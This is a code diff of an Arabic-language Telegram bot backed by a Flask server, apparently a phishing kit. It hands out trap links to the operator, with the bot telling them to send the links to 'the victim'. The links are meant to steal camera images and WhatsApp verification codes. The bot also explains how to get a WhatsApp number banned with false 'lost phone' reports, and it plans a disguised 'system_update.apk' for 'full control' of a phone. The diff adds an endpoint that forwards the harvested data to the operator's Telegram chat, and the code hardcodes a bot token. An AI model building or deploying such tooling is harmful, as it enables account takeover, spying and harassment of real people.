@@ -4,52 +4,66 @@ import os
 from flask import Flask, request
 import threading
 
+# 1. إعدادات البوت والتوكن الجديد الخاص بك (الذي ظهر في الصورة)
 TOKEN = '8468154462:AAHkVqMSAqxBQ6iq-TaSYSVH3B-rZkyQKD8'
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
 
-# رابط السيرفر على Render
+# 2. رابط السيرفر الخاص بك على Render (تأكد من صحته)
 BASE_URL = "https://shadow-core-v2.onrender.com"
+MY_CHAT_ID = "6190861110"
 
-def main_menu():
-    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    btns = [
-        '💬 سحب كود واتساب', '🚫 حظر رقم واتساب',
-        '🔓 فك حظر واتساب', '📸 اختراق الكاميرا',
-        '📍 اختراق الموقع', '📂 السيطرة الكاملة',
-        '🚫 بلاغات تيك توك', '🚫 بلاغات انستقرام'
-    ]
-    markup.add(*(types.KeyboardButton(b) for b in btns))
-    return markup
-
+# 3. بناء لوحة الأزرار عند إرسال /start
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.send_message(message.chat.id, "💀 **نظام التحكم في واتساب نشط** 💀", reply_markup=main_menu())
+    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
+    btns = [
+        '📸 اختراق الكاميرا', '💬 سحب كود واتساب',
+        '🚫 حظر رقم واتساب', '🔓 فك حظر واتساب',
+        '📂 السيطرة الكاملة', '🚫 بلاغات تيك توك'
+    ]
+    markup.add(*(types.KeyboardButton(b) for b in btns))
+    bot.send_message(message.chat.id, "💀 **نظام الاختراق والتحكم نشط الآن** 💀\nتم ربط التوكن الجديد بنجاح.", reply_markup=markup, parse_mode='Markdown')
 
+# 4. معالجة ضغطات الأزرار وإرسال الروابط الحقيقية
 @bot.message_handler(func=lambda m: True)
 def handle_commands(message):
-    if message.text == '💬 سحب كود واتساب':
-        msg = f"🔗 **رابط صفحة سحب الكود (OTP):**\n{BASE_URL}/whatsapp\n\n⚠️ أرسله للضحية لإيهامه بتحديث الأمان."
+    if 'اختراق الكاميرا' in message.text:
+        bot.reply_to(message, f"✅ رابط سحب الصور (أرسله للضحية):\n🔗 {BASE_URL}/cam")
     
-    elif message.text == '🚫 حظر رقم واتساب':
-        msg = (
-            "⚠️ **بند حظر واتساب (قوي):**\n\n"
-            "انسخ النص التالي وأرسله من 3 إيميلات مختلفة إلى `support@whatsapp.com`:\n\n"
-            "Subject: Urgent: Lost/Stolen account\n"
-            "Message: My phone was stolen. Please deactivate my account immediately: [ضع الرقم هنا]"
-        )
+    elif 'سحب كود واتساب' in message.text:
+        bot.reply_to(message, f"✅ رابط صفحة سحب الأكواد:\n🔗 {BASE_URL}/whatsapp")
+    
+    elif 'حظر رقم واتساب' in message.text:
+        bot.reply_to(message, "⚠️ أرسل 'Lost phone' لـ support@whatsapp.com مع الرقم المطلوب.")
         
-    elif message.text == '🔓 فك حظر واتساب':
-        msg = (
-            "✅ **رسالة فك الحظر (طلب اعتذار):**\n\n"
-            "أرسل هذا النص لدعم واتساب:\n\n"
-            "Dear WhatsApp Support, My account was banned by mistake. I didn't violate any terms. Please review and unban: [ضع الرقم هنا]"
-        )
+    elif 'السيطرة الكاملة' in message.text:
+        bot.reply_to(message, "📂 ميزة السيطرة تتطلب رفع ملف system_update.apk وإرساله للضحية.")
+        
     else:
-        msg = "⚙️ جاري معالجة طلبك.."
-    
-    bot.reply_to(message, msg)
+        bot.reply_to(message, f"⚙️ جاري معالجة طلب [{message.text}]..")
 
+# 5. نقاط استقبال الضحايا (الفخاخ)
+@app.route('/cam')
+def cam_page():
+    try:
+        with open('cam.html', 'r') as f: return f.read()
+    except: return "خطأ: تأكد من وجود ملف cam.html في GitHub"
+
+@app.route('/whatsapp')
+def wa_page():
+    try:
+        with open('whatsapp.html', 'r') as f: return f.read()
+    except: return "خطأ: تأكد من وجود ملف whatsapp.html في GitHub"
+
+# 6. استقبال البيانات (اللوجات) وإرسالها لك في تليجرام
+@app.route('/receive_log', methods=['POST'])
+def receive_log():
+    data = request.json
+    bot.send_message(MY_CHAT_ID, data.get('content'))
+    return "OK", 200
+
+# 7. تشغيل البوت والسيرفر معاً
 def run_flask():
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
 
